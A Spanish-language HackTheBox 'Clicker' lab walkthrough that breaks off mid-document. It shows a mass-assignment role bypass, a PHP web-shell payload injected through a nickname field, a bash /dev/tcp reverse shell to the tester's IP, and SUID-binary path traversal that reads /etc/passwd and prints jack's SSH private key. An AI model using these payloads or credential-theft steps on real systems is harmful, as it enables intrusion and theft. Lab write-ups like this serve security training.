---
title: Clicker
platform: HackTheBox
difficulty: Medium
os: Linux
releaseDate: 2023-09-23
date: 2026-08-27
publishedAt: 2026-11-20
tags: [NFS, Mass-Asignment, RCE, IngReversa, Sudoers, Env, Linux, Medium, HTB]
image: ./thumb.png
imageShape: round
userRank: 3693
rating: 4.5
---

---

# Descripcion

Máquina Clicker de HackTheBox. Tras enumerar SSH, HTTP y NFS, el backup compartido filtra el código PHP. Un Mass Assignment permite modificar el rol a Admin y la exportación PHP lleva a RCE, obteniendo shell como www-data. El binario SUID execute_query permite path traversal para leer la clave SSH de jack. Finalmente, abusando de monitor.sh con SETENV y un proxy, se explota XXE para leer la clave de root.

---


# Enumeracion

## Nmap

> Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina.

```bash
$ nmap -p- --open --min-rate 5000 -Pn -n -sS -v 10.129.47.218

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 03:30 +0200
Initiating SYN Stealth Scan at 03:30
Scanning 10.129.47.218 [65535 ports]
Discovered open port 80/tcp on 10.129.47.218
Discovered open port 111/tcp on 10.129.47.218
Discovered open port 22/tcp on 10.129.47.218
Discovered open port 2049/tcp on 10.129.47.218
Discovered open port 45959/tcp on 10.129.47.218
Discovered open port 51433/tcp on 10.129.47.218
Discovered open port 36289/tcp on 10.129.47.218
Discovered open port 44199/tcp on 10.129.47.218
Discovered open port 53625/tcp on 10.129.47.218
Completed SYN Stealth Scan at 03:30, 11.67s elapsed (65535 total ports)
Nmap scan report for 10.129.47.218
Host is up (0.041s latency).
Not shown: 65509 closed tcp ports (reset), 17 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
36289/tcp open  unknown
44199/tcp open  unknown
45959/tcp open  unknown
51433/tcp open  unknown
53625/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.74 seconds
           Raw packets sent: 67095 (2.952MB) | Rcvd: 65561 (2.622MB)
```

> Una vez identificados los puertos abiertos, realizamos un segundo escaneo utilizando los scripts predeterminados de Nmap y la detección de versiones para obtener más información sobre los servicios.

```bash
$ nmap -p22,80,111,2049,36289,44199,45959,51433,53625 -sC -sV 10.129.47.218

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 03:31 +0200
Nmap scan report for 10.129.47.218
Host is up (0.090s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://clicker.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43785/udp6  mountd
|   100005  1,2,3      44199/tcp   mountd
|   100005  1,2,3      47036/udp   mountd
|   100005  1,2,3      47441/tcp6  mountd
|   100021  1,3,4      36539/tcp6  nlockmgr
|   100021  1,3,4      45959/tcp   nlockmgr
|   100021  1,3,4      47227/udp   nlockmgr
|   100021  1,3,4      60147/udp6  nlockmgr
|   100024  1          39499/udp6  status
|   100024  1          51433/tcp   status
|   100024  1          53791/tcp6  status
|   100024  1          58965/udp   status
|  100227  3           2049/tcp   nfs_acl
|_ 100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36289/tcp open  mountd   1-3 (RPC #100005)
44199/tcp open  mountd   1-3 (RPC #100005)
45959/tcp open  nlockmgr 1-4 (RPC #100021)
51433/tcp open  status   1 (RPC #100024)
53625/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

> Observamos que el servicio HTTP del puerto `80` nos redirige al dominio `clicker.htb`. Para poder acceder correctamente a la página, añadimos este dominio a nuestro archivo `/etc/hosts`, asociándolo con la dirección IP de la máquina.

## Web

> Comenzamos identificando las tecnologías utilizadas por la aplicación mediante `WhatWeb`.

**WhatWeb**

```bash
$ whatweb http://clicker.htb/
```

![Pasted-image-20261119234011.png](./Images/Pasted-image-20261119234011.png)

- **Aplicación web**

![Pasted-image-20261119234016.png](./Images/Pasted-image-20261119234016.png)

> A continuación, utilizamos `Gobuster` para enumerar posibles directorios y archivos accesibles en el servidor web.

```bash
$ gobuster dir -u http://clicker.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -x txt,php,php.bak
```

![Pasted-image-20261119234021.png](./Images/Pasted-image-20261119234021.png)

## Enumeración de NFS

> Como hemos identificado el servicio `NFS` abierto en el puerto `2049`, vamos a comprobar si existe algún recurso compartido que podamos montar desde nuestra máquina.

Utilizamos `showmount` para enumerar los recursos exportados:

```bash
$ showmount -e 10.129.47.218

Export list for 10.129.47.218:
/mnt/backups *
```

> Encontramos que el directorio `/mnt/backups` está compartido y permite conexiones desde cualquier dirección IP (`*`). Vamos a montarlo en nuestra máquina para poder examinar su contenido. Para ello, creamos un directorio llamado `mnt` y lo utilizamos como punto de montaje.

```bash
$ sudo mount -t nfs 10.129.47.218:/ ./mnt/ -o nolock
```

> Una vez montado el recurso, comprobamos su contenido.

![Pasted-image-20261119234026.png](./Images/Pasted-image-20261119234026.png)

> Copiamos los archivos encontrados a nuestro directorio de trabajo y los extraemos para poder analizarlos.

![Pasted-image-20261119234031.png](./Images/Pasted-image-20261119234031.png)

> Nos encontramos con varios archivos pertenecientes a la aplicación web. Tras analizar los archivos PHP, encontramos algunas funciones interesantes que podrían permitirnos modificar información de los usuarios.

# Shell as www-data

## Análisis del código fuente

> Comenzamos revisando el archivo `admin.php`:

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
    header('Location: /index.php');
    die;
}
?>
```

> Observamos que el acceso al panel de administración está protegido mediante una comprobación de sesión. Para acceder, el valor de `$_SESSION["ROLE"]` debe ser exactamente `Admin`. En caso contrario, la aplicación nos redirige a `index.php`.


> Continuamos analizando `db_utils.php`, donde encontramos las funciones encargadas de interactuar con la base de datos.

```php
<?php
session_start();

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";
$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);

function check_exists($player) {
    global $pdo;
    $params = ["player" => $player];
    $stmt = $pdo->prepare("SELECT count(*) FROM players WHERE username = :player");
    $stmt->execute($params);
    $result = $stmt->fetchColumn();
    if ($result > 0) {
        return true;
    }
    return false;
}

function create_new_player($player, $password) {
    global $pdo;
    $params = ["player"=>$player, "password"=>hash("sha256", $password)];
    $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
    $stmt->execute($params);
}

function check_auth($player, $password) {
    global $pdo;
    $params = ["player" => $player];
    $stmt = $pdo->prepare("SELECT password FROM players WHERE username = :player");
    $stmt->execute($params);
    if ($stmt->rowCount() > 0) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if(strcmp($row['password'], hash("sha256",$password)) == 0){
            return true;
        }
    }
    return false;
}

function load_profile($player) {
    global $pdo;
    $params = ["player"=>$player];
    $stmt = $pdo->prepare("SELECT nickname, role, clicks, level FROM players WHERE username = :player");
    $stmt->execute($params);
    if ($stmt->rowCount() > 0) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        return $row;
    }
    return array();
}

function save_profile($player, $args) {
    global $pdo;
    $params = ["player"=>$player];
    $setStr = "";
    foreach ($args as $key => $value) {
            $setStr .= $key . "=" . $pdo->quote($value) . ",";
    }
    $setStr = rtrim($setStr, ",");
    $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
    $stmt -> execute($params);
}

// ONLY FOR THE ADMIN
function get_top_players($number) {
    global $pdo;
    $stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    return $result;
}
function get_current_player($player) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT nickname, clicks, level FROM players WHERE username = :player");
    $stmt->bindParam(':player', $player, PDO::PARAM_STR);
    $stmt->execute();
    if ($stmt->rowCount() > 0) {
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    } else {
        return null;
    }
}

?>
```

> En este archivo encontramos las funciones que gestionan las operaciones con la base de datos. También podemos identificar las credenciales utilizadas para conectarse a MySQL:
>
> - Usuario: `clicker_db_user`
> - Contraseña: `clicker_db_password`
> - Base de datos: `clicker`

> Si nos fijamos en la siguiente función, podemos observar cómo se crea un nuevo usuario:

```php
function create_new_player($player, $password) {
    global $pdo;
    $params = ["player"=>$player, "password"=>hash("sha256", $password)];
    $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
    $stmt->execute($params);
}
```

> Aquí vemos los campos que se insertan al registrar un usuario:

```text
username, nickname, password, role, clicks, level
```

> Por otro lado, encontramos una función especialmente interesante: `save_profile()`. La analizaremos más adelante, ya que interviene directamente en la modificación de los datos de los jugadores.


> Continuamos con el archivo `save_game.php`:

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
    $args = [];
    foreach($_GET as $key=>$value) {
        if (strtolower($key) === 'role') {
            // prevent malicious users to modify role
            header('Location: /index.php?err=Malicious activity detected!');
            die;
        }
        $args[$key] = $value;
    }
    save_profile($_SESSION['PLAYER'], $_GET);
    // update session info
    $_SESSION['CLICKS'] = $_GET['clicks'];
    $_SESSION['LEVEL'] = $_GET['level'];
    header('Location: /index.php?msg=Game has been saved!');

}
?>
```

> En este archivo observamos que la aplicación recoge los parámetros enviados mediante una petición `GET` y los pasa directamente a la función `save_profile()` de `db_utils.php`.
>
> También encontramos una comprobación que impide modificar directamente el parámetro `role`. Si detecta que el nombre del parámetro coincide con `role` (ignorando mayúsculas y minúsculas), bloquea la petición y nos redirige a `index.php`.

## Entrar como admin en la web

> Vamos a revisar nuevamente la función `save_profile()`:

```php
function save_profile($player, $args) {
    global $pdo;
    $params = ["player"=>$player];
    $setStr = "";
    foreach ($args as $key => $value) {
            $setStr .= $key . "=" . $pdo->quote($value) . ",";
    }
    $setStr = rtrim($setStr, ",");
    $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
    $stmt -> execute($params);
}
```

> Esta función recorre los parámetros recibidos y construye dinámicamente una sentencia `UPDATE` de SQL. Para cada parámetro, utiliza su nombre como columna y aplica `PDO::quote()` al valor correspondiente.
>
> Por ejemplo, si enviamos los parámetros `clicks=500` y `level=3`, la consulta resultante tendría esta estructura:

```sql
UPDATE players SET clicks='500', level='3' WHERE username = :player
```

> Aquí encontramos el problema: aunque los valores se escapan mediante `PDO::quote()`, los nombres de las columnas se concatenan directamente en la consulta, sin validación ni delimitación.
>
> Como `save_game.php` bloquea el parámetro `role`, tendremos que buscar una manera de eludir esa comprobación. Para ello, vamos a registrarnos en la aplicación e interceptar la petición utilizando Burp Suite.


![Pasted-image-20261119234042.png](./Images/Pasted-image-20261119234042.png)

> Una vez registrados, interceptamos la petición correspondiente al guardado de la partida. Si intentamos añadir directamente el parámetro `role`, la aplicación detectará la actividad y bloqueará la petición.

![Pasted-image-20261119234047.png](./Images/Pasted-image-20261119234047.png)

> Para realizar el bypass, vamos a aprovechar la forma en la que se construye la consulta SQL. En lugar de enviar `role` como un parámetro independiente, podemos introducirlo dentro del nombre de otro parámetro utilizando una codificación URL.
>
> De esta manera, conseguimos que la comprobación de `save_game.php` no identifique un parámetro cuyo nombre sea exactamente `role`, pero que la cadena concatenada termine incorporando esa columna a la consulta.
>
> El objetivo es conseguir que se ejecute una sentencia como la siguiente:

```sql
UPDATE players SET role='Admin', clicks='500', level='3' WHERE username = :player
```

> Para ello, enviamos la siguiente petición:

```http
GET /save_game.php?role%3d'Admin',clicks=16&level=0
```

![Pasted-image-20261119234052.png](./Images/Pasted-image-20261119234052.png)

> Una vez enviada la petición, hacemos `logout` y volvemos a autenticarnos. Al cargar nuevamente la información de nuestra sesión, la aplicación recoge el nuevo rol y ya tendremos acceso como administradores.

![Pasted-image-20261119234056.png](./Images/Pasted-image-20261119234056.png)

![Pasted-image-20261119234101.png](./Images/Pasted-image-20261119234101.png)

## RCE

> Al acceder al panel de administración, encontramos una funcionalidad de exportación. Vamos a interceptar con Burp Suite la petición que se genera al pulsar el botón `Export`.

![Pasted-image-20261119234106.png](./Images/Pasted-image-20261119234106.png)

> Vamos a probar a modificar la extensión del archivo de exportación a `php` para comprobar cómo procesa el servidor el archivo generado.

![Pasted-image-20261119234110.png](./Images/Pasted-image-20261119234110.png)

> Una vez realizada la exportación, nos dirigimos al archivo generado.

![Pasted-image-20261119234116.png](./Images/Pasted-image-20261119234116.png)

> Comprobamos que el servidor interpreta correctamente el archivo `.php` y que, además, aparece la información del usuario que hemos creado.
>
> Teniendo en cuenta que el archivo se ejecuta como PHP, podemos intentar conseguir ejecución remota de comandos. Para ello, vamos a aprovechar el `Mass Assignment` que utilizamos anteriormente para modificar el rol del usuario.
>
> Como vimos en el código de la aplicación, cada jugador dispone de un campo `nickname`. Vamos a modificarlo para introducir código PHP que ejecute los comandos que enviemos mediante el parámetro `cmd`.

Enviamos la siguiente petición:

```http
GET /save_game.php?clicks=16&level=0&nickname='<?php system($_GET["cmd"]); ?>'
```

![Pasted-image-20261119234120.png](./Images/Pasted-image-20261119234120.png)

> Ahora volvemos a la funcionalidad `Export`, seleccionamos nuevamente el formato `.php` y accedemos al archivo generado. Esta vez, añadiremos un comando mediante el parámetro `cmd` para comprobar si conseguimos ejecutarlo.

![Pasted-image-20261119234125.png](./Images/Pasted-image-20261119234125.png)

> Conseguimos ejecutar comandos en el servidor. El siguiente paso será obtener una reverse shell para disponer de una terminal interactiva.

## Reverse Shell

> Primero, ponemos nuestra máquina a la escucha utilizando Netcat:

```bash
nc -nvlp 7777
```

> A continuación, enviamos el siguiente comando para establecer una conexión inversa hacia nuestra máquina:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.119/7777 0>&1'
```

> Lo codificamos para poder enviarlo correctamente mediante la petición:

```text
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.119/7777+0>%261'
```

![Pasted-image-20261119234130.png](./Images/Pasted-image-20261119234130.png)

> Conseguimos establecer una reverse shell y obtenemos acceso al sistema con el usuario `www-data`.

# Shell como jack

## Enumeración interna

> Una vez dentro del sistema, comenzamos enumerando los usuarios existentes para identificar posibles cuentas que podamos comprometer.

```bash
$ cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
```

Comprobamos también el contenido del directorio `/home`:

```bash
$ ls -la /home

drwxr-xr-x  3 root root 4096 Sep  5  2023 .
drwxr-xr-x 18 root root 4096 Sep  5  2023 ..
drwxr-x---  7 jack jack 4096 Sep  6  2023 jack
```

> Como podemos observar, el único usuario adicional que tiene una shell Bash habilitada es `jack`. Por tanto, vamos a centrar nuestra enumeración en encontrar una manera de acceder a su cuenta.

> Si comprobamos los puertos en escucha del sistema, encontramos que el puerto `3306` está abierto únicamente en la interfaz de loopback (`127.0.0.1`).

```bash
$ netstat -tunlp

tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
```

> Esto nos indica que existe un servicio escuchando localmente en el puerto `3306`, posiblemente una base de datos MySQL.
>
> Recordamos que durante el análisis de los archivos de la aplicación habíamos encontrado unas credenciales de conexión en `db_utils.php`. Vamos a comprobar si podemos utilizarlas para acceder a la base de datos.

![Pasted-image-20261119234136.png](./Images/Pasted-image-20261119234136.png)

> Las credenciales encontradas son:

```text
user: clicker_db_user
pass: clicker_db_password
```

## MYSQL (RabbitHole)

> Iniciamos sesión utilizando las credenciales anteriores:

```bash
$ mysql -u clicker_db_user -p
```

![Pasted-image-20261119234141.png](./Images/Pasted-image-20261119234141.png)

> Conseguimos acceder correctamente a la base de datos. Tras enumerar su contenido, encontramos una tabla llamada `players`, que contiene la información de los usuarios registrados en la aplicación.

![Pasted-image-20261119234145.png](./Images/Pasted-image-20261119234145.png)

![Pasted-image-20261119234148.png](./Images/Pasted-image-20261119234148.png)

> Dentro de esta tabla encontramos varios usuarios junto con sus contraseñas almacenadas mediante hashes `SHA-256`. Intentamos crackearlos, pero no conseguimos obtener ningún resultado.

## Enumeracio /opt

> Como no conseguimos avanzar mediante la base de datos, continuamos investigando los archivos y directorios del sistema. Durante la enumeración llegamos al directorio `/opt`, donde encontramos una carpeta llamada `manage` y un script denominado `monitor.sh`.

```bash
$ ls -la /opt

total 16
drwxr-xr-x  3 root root 4096 Jul 20  2023 .
drwxr-xr-x 18 root root 4096 Sep  5  2023 ..
drwxr-xr-x  2 jack jack 4096 Jul 21  2023 manage
-rwxr-xr-x  1 root root  504 Jul 20  2023 monitor.sh
```

> Entramos en el directorio `manage` y comprobamos su contenido:

```bash
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21  2023 .
drwxr-xr-x 3 root root  4096 Jul 20  2023 ..
-rw-rw-r-- 1 jack jack   256 Jul 21  2023 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
```

> Encontramos un archivo `README.txt` y un binario llamado `execute_query`. Este último tiene activados los permisos `SUID` y `SGID`, por lo que merece la pena analizar su funcionamiento.

> Comenzamos leyendo el archivo `README.txt`:

```text
Web application Management

Use the binary to execute the following task:
- 1: Creates the database structure and adds user admin
- 2: Creates fake players (better not tell anyone)
- 3: Resets the admin password
- 4: Deletes all users except the admin
```

> El archivo contiene las instrucciones de uso del binario y describe cuatro operaciones relacionadas con la gestión de la aplicación y su base de datos.
>
> Vamos a identificar el tipo de archivo y sus características:

```bash
$ file execute_query

execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```

> Confirmamos que se trata de un ejecutable ELF de 64 bits con los permisos `SUID` y `SGID` habilitados.
>
> Vamos a probar su funcionamiento utilizando la opción `1`:

```bash
$ ./execute_query 1
```

![Pasted-image-20261119234154.png](./Images/Pasted-image-20261119234154.png)

> Observamos que se ejecuta una operación `INSERT` para añadir el usuario `admin` a la base de datos.
>
> Para poder analizar su funcionamiento con mayor detalle, vamos a transferir el binario a nuestra máquina y realizar ingeniería inversa utilizando `Ghidra`.
>
> Para ello, levantaremos un servidor HTTP desde nuestra máquina y descargaremos el archivo desde la máquina víctima.

**Levantamos un servidor HTTP:**

```bash
$ python3 -m http.server 9000
```

**Descargamos el binario:**

```bash
$ wget http://10.129.49.215:9000/execute_query
```

> Una vez descargado, abrimos el archivo con `Ghidra` para analizar su función principal.

## Análisis del binario con Ghidra

Este es el código decompilado que obtenemos:

```c
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  char local_98 [32];
  char local_78 [88];
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    builtin_strncpy(local_98,"/home/jack/queries/",0x14);
    sVar4 = strlen(local_98);
    sVar5 = strlen(pcVar3);
    __dest = calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      builtin_strncpy(local_78,
                      "/usr/bin/mysql -u clicker_db_user --password=\'clicker_db_password\' clicker -v < "
                      ,0x51);
      sVar4 = strlen(local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

> Vamos a analizar las partes más interesantes del código para entender cómo funciona el binario y dónde se encuentra el problema.

**1. Comprobación inicial y protección de pila**

```c
local_20 = *(long *)(in_FS_OFFSET + 0x28);
```

> Esta instrucción obtiene el valor del *stack canary* almacenado en el segmento de datos del hilo (`FS`). Posteriormente, el programa comprueba que este valor no haya sido modificado antes de finalizar.
>
> Se trata de un mecanismo de protección frente a determinados ataques de `Buffer Overflow`, ya que permite detectar modificaciones inesperadas en la pila.

**2. Selección del archivo**

```c
if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
}
else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
```

> Aquí comprobamos que el programa haya recibido al menos un argumento. Posteriormente, convierte el primer argumento a un número mediante `atoi()` y utiliza un `switch` para seleccionar el archivo SQL que debe ejecutar.
>
> Las opciones del `1` al `4` corresponden a los archivos definidos previamente. Sin embargo, encontramos algo interesante en el bloque `default`: si introducimos cualquier otro número distinto de `0` a `4`, el programa copia el nombre del archivo proporcionado como segundo argumento.
>
> Este comportamiento nos permite controlar el nombre del archivo que posteriormente se utilizará.

**3. Construcción de la ruta y comprobación de permisos**

```c
builtin_strncpy(local_98,"/home/jack/queries/",0x14);
sVar4 = strlen(local_98);
sVar5 = strlen(pcVar3);
__dest = calloc(sVar5 + sVar4 + 1,1);
strcat(__dest,local_98);
strcat(__dest,pcVar3);
setreuid(1000,1000);
iVar1 = access(__dest,4);
```

> En este bloque se define la ruta base `/home/jack/queries/` y se concatena con el nombre del archivo que hemos seleccionado anteriormente. El resultado se almacena en `__dest`.
>
> A continuación, encontramos `setreuid(1000,1000)`, que establece los identificadores real y efectivo del proceso en el UID `1000`, correspondiente al usuario `jack`.
>
> Por último, mediante `access(__dest,4)`, comprueba si el archivo indicado tiene permisos de lectura para el proceso.

**4. Ejecución del archivo SQL**

```c
if (iVar1 == 0) {
    builtin_strncpy(local_78,
                    "/usr/bin/mysql -u clicker_db_user --password=\'clicker_db_password\' clicker -v < "
                    ,0x51);
    sVar4 = strlen(local_78);
    sVar5 = strlen(pcVar3);
    pcVar3 = calloc(sVar5 + sVar4 + 1,1);
    strcat(pcVar3,local_78);
    strcat(pcVar3,__dest);
    system(pcVar3);
}
else {
    puts("File not readable or not found");
}
```

> Si el archivo tiene permisos de lectura, el programa construye el siguiente comando:

```bash
/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < [archivo]
```

> Finalmente, ejecuta el comando mediante `system()`, utilizando el archivo indicado como entrada estándar de MySQL.
>
> Esto significa que podemos controlar qué archivo intenta leer el programa, siempre que se encuentre en una ubicación accesible mediante la ruta base y supere la comprobación de permisos.

## Lectura arbitraria de archivos

> Para acceder al bloque `default`, debemos proporcionar un número distinto de `0` a `4` y un segundo argumento con el nombre del archivo que queremos leer.
>
> Teniendo en cuenta que el programa utiliza como directorio base `/home/jack/queries/`, podemos intentar aprovechar secuencias de recorrido de directorios (`../`) para salir de esa ubicación y acceder a otros archivos del sistema.

> Probamos a leer `/etc/passwd`:

```bash
$ ./execute_query 6 ../../../etc/passwd
```

![Pasted-image-20261119234203.png](./Images/Pasted-image-20261119234203.png)

> Conseguimos leer correctamente el archivo `/etc/passwd`. Sin embargo, si intentamos acceder directamente al archivo `user.txt`, comprobamos que no podemos leerlo:

```bash
$ ./execute_query 6 ../user.txt
```

![Pasted-image-20261119234206.png](./Images/Pasted-image-20261119234206.png)

> Como no conseguimos acceder al archivo `user.txt`, vamos a probar con otro objetivo: la clave privada SSH del usuario `jack`.
>
> Recordemos que el binario establece los identificadores del proceso como el usuario `jack`, por lo que podremos acceder a los archivos que este usuario tenga permisos para leer.

Ejecutamos:

```bash
$ ./execute_query 6 ../.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm
pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e
30OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E/5CA6akeQbbGAppTi+EBG9Lhr04c9E
2uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2
EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T/P9WCf7Us4KEfRZ
KPCNVKS5xwi89hM7G/zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq
f3pDPBPu/9/VWeX3tRcGY+IkSiPoPwVUBXJbICtNgefeBpDs99z/2c7Xto1U4Jst/obTxO
TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK+iJT7p7sN5f5bsr0
RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl+H6Pv3zcHXH3LQVJqa+TccdBgh9
cC5x7G8fv6AZD88bs3fgXBjWaexT/HJ/nRBc9rcvC7NDK/l1uaH4rxMK9/nt9DoLaS+kIT
tni4mVayFzh4j81uPXpr+MYbqDxdxP+QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4
lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy
FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2+XSjNTXo21
1LS8bFj1iGJ2WhbXBErQ0bdkvZE3+twsUyrSL/xIL2q1DxgX7sucfnNZLNze9M2akvRabq
DL53NSKxpvqS/v1AmaygePTmmrz/mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2+KfAoa3uu7ufyC
kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO+R+xEQsemUFy0vCh4TyezD3i
SlyE8yMm8gdIgYJB+FP5m4eUyGTjTE4+lhXOKgEGPcw9+MK7Li05Kbgsv/ZwuLiI8UNAhc
9vgmEfs/hoiZPX6fpG+u4L82oKJuIbxF/I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk/8H6usN
9pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ+qagLrl7O33aez3B/OAUrYmsBAAAA
wQDB7xyKB85+On0U9Qk1jS85dNaEeSBGb7Yp4e/oQGiHquN/xBgaZzYTEO7WQtrfmZMM4s
SXT5qO0J8TBwjmkuzit3/BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s
FQsp6ggRGCP64C8N854//KuxhTh5UXHmD7+teKGdbi9MjfDygwk+gQ33YIr2KczVgdltwW
